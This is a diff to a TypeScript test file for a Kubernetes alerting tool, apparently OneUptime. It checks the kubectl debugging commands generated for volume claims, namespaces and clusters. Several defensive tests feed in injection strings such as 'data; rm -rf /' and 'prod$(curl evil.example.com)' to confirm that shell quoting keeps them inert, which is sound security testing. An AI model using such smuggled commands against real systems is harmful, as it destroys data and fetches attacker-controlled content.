@@ -2,6 +2,12 @@ import SlackUtil from "../../../../Server/Utils/Workspace/Slack/Slack";
 import { JSONObject } from "../../../../Types/JSON";
 import { marked, Token, Tokens } from "marked";
 import MonitorType from "../../../../Types/Monitor/MonitorType";
+import MonitorStep from "../../../../Types/Monitor/MonitorStep";
+import {
+  getAllKubernetesAlertTemplates,
+  KubernetesAlertTemplate,
+} from "../../../../Types/Monitor/KubernetesAlertTemplates";
+import ObjectID from "../../../../Types/ObjectID";
 import SeriesDebugHints, {
   SeriesDebugCommand,
 } from "../../../../Types/Monitor/SeriesContext/SeriesDebugHints";
@@ -156,13 +162,312 @@ describe("SeriesDebugHints", () => {
       expect(commands).toContain("kubectl logs web-1 -n prod --tail=200");
     });
 
-    test("emits nothing at all when no pod, node or workload is named", () => {
+    test("emits nothing at all when the series names nothing kubectl can address", () => {
+      /*
+       * A container is addressed through its pod, and a service name is no
+       * Kubernetes object: neither is enough for a command.
+       */
       expect(
         getCommandStrings({
           monitorType: MonitorType.Kubernetes,
-          seriesLabels: { "resource.k8s.cluster.name": "prod-eu" },
+          seriesLabels: { "resource.k8s.container.name": "app" },
         }),
       ).toEqual([]);
+      expect(
+        getCommandStrings({
+          monitorType: MonitorType.Kubernetes,
+          seriesLabels: { "resource.service.name": "checkout-api" },
+        }),
+      ).toEqual([]);
+    });
+
+    /*
+     * Regression (#9738): PVC Almost Full grouped by a claim and its
+     * namespace, and SeriesDebugHints knew no command for a claim, so its
+     * alert came with nothing to run.
+     */
+    describe("a persistent volume claim", () => {
+      test("is described in its namespace, then the storage classes say whether it can grow", () => {
+        expect(
+          getCommandStrings({
+            monitorType: MonitorType.Kubernetes,
+            seriesLabels: {
+              "resource.k8s.namespace.name": "prod",
+              "resource.k8s.persistentvolumeclaim.name": "data-postgres-0",
+            },
+          }),
+        ).toEqual([
+          "kubectl describe pvc data-postgres-0 -n prod",
+          "kubectl get storageclass",
+        ]);
+      });
+
+      test("says why each command is there: what describe shows, and the column that answers expansion", () => {
+        const commands: Array<SeriesDebugCommand> =
+          SeriesDebugHints.getDebugCommands({
+            monitorType: MonitorType.Kubernetes,
+            seriesLabels: {
+              "resource.k8s.namespace.name": "prod",
+              "resource.k8s.persistentvolumeclaim.name": "data-postgres-0",
+            },
+          });
+
+        expect(commands[0]!.purpose).toContain("pods that mount it");
+        expect(commands[1]!.purpose).toContain("ALLOWVOLUMEEXPANSION");
+      });
+
+      test("omits -n rather than guessing when the claim's namespace is unknown", () => {
+        const commands: Array<string> = getCommandStrings({
+          monitorType: MonitorType.Kubernetes,
+          seriesLabels: {
+            "k8s.persistentvolumeclaim.name": "data-postgres-0",
+          },
+        });
+
+        expect(commands[0]).toBe("kubectl describe pvc data-postgres-0");
+        expect(
+          commands.some((command: string) => {
+            return command.includes("-n ");
+          }),
+        ).toBe(false);
+      });
+
+      test("a claim's namespace does not add the namespace-wide commands", () => {
+        const commands: Array<string> = getCommandStrings({
+          monitorType: MonitorType.Kubernetes,
+          seriesLabels: {
+            "resource.k8s.namespace.name": "prod",
+            "resource.k8s.persistentvolumeclaim.name": "data-postgres-0",
+            "resource.k8s.cluster.name": "prod-eu",
+          },
+        });
+
+        expect(
+          commands.some((command: string) => {
+            return (
+              command.startsWith("kubectl top") ||
+              command.startsWith("kubectl get nodes") ||
+              command.startsWith("kubectl get pods")
+            );
+          }),
+        ).toBe(false);
+      });
+
+      test("a hostile claim name stays one inert argument", () => {
+        const commands: Array<string> = getCommandStrings({
+          monitorType: MonitorType.Kubernetes,
+          seriesLabels: {
+            "resource.k8s.namespace.name": "prod",
+            "resource.k8s.persistentvolumeclaim.name": "data; rm -rf /",
+          },
+        });
+
+        expect(commands[0]).toBe(
+          "kubectl describe pvc 'data; rm -rf /' -n prod",
+        );
+      });
+    });
+
+    /*
+     * Regression (#9738): Namespace Daily Cost Over Budget groups by the
+     * namespace alone, and a namespace alone got no command.
+     */
+    describe("a namespace on its own", () => {
+      const NAMESPACE_ONLY: JSONObject = {
+        "resource.k8s.namespace.name": "payments",
+      };
+
+      test("shows what its pods use, what they request and how many replicas each workload runs", () => {
+        expect(
+          getCommandStrings({
+            monitorType: MonitorType.Kubernetes,
+            seriesLabels: NAMESPACE_ONLY,
+          }),
+        ).toEqual([
+          "kubectl top pods -n payments --sort-by=cpu",
+          "kubectl get pods -n payments -o custom-columns='NAME:.metadata.name,CPU_REQUESTS:.spec.containers[*].resources.requests.cpu,MEMORY_REQUESTS:.spec.containers[*].resources.requests.memory,NODE:.spec.nodeName'",
+          "kubectl get deployments,statefulsets,daemonsets -n payments",
+        ]);
+      });
+
+      test("keeps the custom-columns JSONPath inside single quotes, so zsh does not read [*] as a glob", () => {
+        const requests: string = getCommandStrings({
+          monitorType: MonitorType.Kubernetes,
+          seriesLabels: NAMESPACE_ONLY,
+        })[1]!;
+
+        const quoted: string = requests.slice(
+          requests.indexOf("'"),
+          requests.lastIndexOf("'") + 1,
+        );
+
+        expect(quoted).toContain("[*]");
+        expect(requests.replace(quoted, "")).not.toContain("[*]");
+      });
+
+      test("wins over the cluster when the series names both", () => {
+        const commands: Array<string> = getCommandStrings({
+          monitorType: MonitorType.Kubernetes,
+          seriesLabels: {
+            ...NAMESPACE_ONLY,
+            "resource.k8s.cluster.name": "prod-eu",
+          },
+        });
+
+        expect(commands[0]).toBe("kubectl top pods -n payments --sort-by=cpu");
+        expect(commands).not.toContain("kubectl top nodes");
+      });
+
+      test("is not added when the series names a pod or a workload in it", () => {
+        for (const seriesLabels of [
+          { ...NAMESPACE_ONLY, "resource.k8s.pod.name": "api-1" },
+          { ...NAMESPACE_ONLY, "resource.k8s.deployment.name": "api" },
+          { ...NAMESPACE_ONLY, "resource.k8s.hpa.name": "api" },
+        ]) {
+          expect(
+            getCommandStrings({
+              monitorType: MonitorType.Kubernetes,
+              seriesLabels,
+            }).some((command: string) => {
+              return command.includes("--sort-by=cpu");
+            }),
+          ).toBe(false);
+        }
+      });
+
+      test("a hostile namespace stays one inert argument in every command", () => {
+        const commands: Array<string> = getCommandStrings({
+          monitorType: MonitorType.Kubernetes,
+          seriesLabels: {
+            "resource.k8s.namespace.name": "prod$(curl evil.example.com)",
+          },
+        });
+
+        expect(commands.length).toBe(3);
+
+        for (const command of commands) {
+          expect(command).toContain(" -n 'prod$(curl evil.example.com)'");
+        }
+      });
+    });
+
+    /*
+     * Regression (#9738): Cluster Daily Cost Over Budget and High Idle Spend
+     * group by the cluster alone, and a cluster alone got no command.
+     */
+    describe("a cluster on its own", () => {
+      test("shows the nodes it pays for, newest last, then how much of each is used", () => {
+        expect(
+          getCommandStrings({
+            monitorType: MonitorType.Kubernetes,
+            seriesLabels: { "resource.k8s.cluster.name": "prod-eu" },
+          }),
+        ).toEqual([
+          "kubectl get nodes -L node.kubernetes.io/instance-type -L topology.kubernetes.io/zone --sort-by=.metadata.creationTimestamp",
+          "kubectl top nodes",
+        ]);
+      });
+
+      test("never puts the cluster's name on the command line: it is OneUptime's name, not a kubectl context", () => {
+        for (const command of getCommandStrings({
+          monitorType: MonitorType.Kubernetes,
+          seriesLabels: { "resource.k8s.cluster.name": "prod-eu; rm -rf /" },
+        })) {
+          expect(command).not.toContain("prod-eu");
+          expect(command).not.toContain("--context");
+        }
+      });
+
+      test("is not added when the series names a node or a pod", () => {
+        const nodeCommands: Array<string> = getCommandStrings({
+          monitorType: MonitorType.Kubernetes,
+          seriesLabels: {
+            "resource.k8s.cluster.name": "prod-eu",
+            "resource.k8s.node.name": "ip-10-0-3-14",
+          },
+        });
+        const podCommands: Array<string> = getCommandStrings({
+          monitorType: MonitorType.Kubernetes,
+          seriesLabels: {
+            ...KUBERNETES_POD_LABELS,
+            "resource.k8s.cluster.name": "prod-eu",
+          },
+        });
+
+        expect(nodeCommands[0]).toBe("kubectl describe node ip-10-0-3-14");
+        expect(nodeCommands).not.toContain("kubectl top nodes");
+        expect(podCommands[0]).toBe(
+          "kubectl describe pod checkout-7d9f-2xk -n prod",
+        );
+        expect(podCommands).not.toContain("kubectl top nodes");
+      });
+    });
+
+    /*
+     * The four templates #9738 found without a first command, read from the
+     * templates themselves: a template that changes what it groups by is
+     * checked against what it groups by now, not against a copy here.
+     */
+    describe("the shipped templates that group by a claim, a namespace or a cluster", () => {
+      function firstCommandFor(templateId: string): string {
+        const template: KubernetesAlertTemplate | undefined =
+          getAllKubernetesAlertTemplates().find(
+            (candidate: KubernetesAlertTemplate) => {
+              return candidate.id === templateId;
+            },
+          );
+
+        expect(template).toBeDefined();
+
+        const step: MonitorStep = template!.getMonitorStep({
+          clusterIdentifier: "prod-eu",
+          onlineMonitorStatusId: ObjectID.generate(),
+          offlineMonitorStatusId: ObjectID.generate(),
+          defaultIncidentSeverityId: ObjectID.generate(),
+          defaultAlertSeverityId: ObjectID.generate(),
+          monitorName: "Test Monitor",
+        });
+
+        const seriesLabels: JSONObject = {};
+
+        for (const key of MonitorStep.getGroupByAttributeKeys(step)) {
+          seriesLabels[key] = {
+            "resource.k8s.cluster.name": "prod-eu",
+            "resource.k8s.namespace.name": "payments",
+            "resource.k8s.persistentvolumeclaim.name": "data-postgres-0",
+          }[key] as string;
+        }
+
+        const commands: Array<string> = getCommandStrings({
+          monitorType: MonitorType.Kubernetes,
+          seriesLabels,
+        });
+
+        expect(commands.length).toBeGreaterThan(0);
+
+        return commands[0]!;
+      }
+
+      test.each([
+        [
+          "k8s-pvc-almost-full",
+          "kubectl describe pvc data-postgres-0 -n payments",
+        ],
+        [
+          "k8s-namespace-daily-cost",
+          "kubectl top pods -n payments --sort-by=cpu",
+        ],
+        [
+          "k8s-cluster-daily-cost",
+          "kubectl get nodes -L node.kubernetes.io/instance-type -L topology.kubernetes.io/zone --sort-by=.metadata.creationTimestamp",
+        ],
+        [
+          "k8s-high-idle-cost",
+          "kubectl get nodes -L node.kubernetes.io/instance-type -L topology.kubernetes.io/zone --sort-by=.metadata.creationTimestamp",
+        ],
+      ])("%s starts with %s", (templateId: string, expected: string) => {
+        expect(firstCommandFor(templateId)).toBe(expected);
+      });
     });
 
     test.each([
@@ -968,6 +1273,21 @@ describe("SeriesDebugHints", () => {
           "resource.k8s.hpa.name": "web-hpa",
           "resource.k8s.node.name": "ip-10-0-3-14",
         },
+      },
+      {
+        monitorType: MonitorType.Kubernetes,
+        seriesLabels: {
+          "resource.k8s.namespace.name": "prod",
+          "resource.k8s.persistentvolumeclaim.name": "data-postgres-0",
+        },
+      },
+      {
+        monitorType: MonitorType.Kubernetes,
+        seriesLabels: { "resource.k8s.namespace.name": "payments" },
+      },
+      {
+        monitorType: MonitorType.Kubernetes,
+        seriesLabels: { "resource.k8s.cluster.name": "prod-eu" },
       },
       {
         monitorType: MonitorType.Docker,
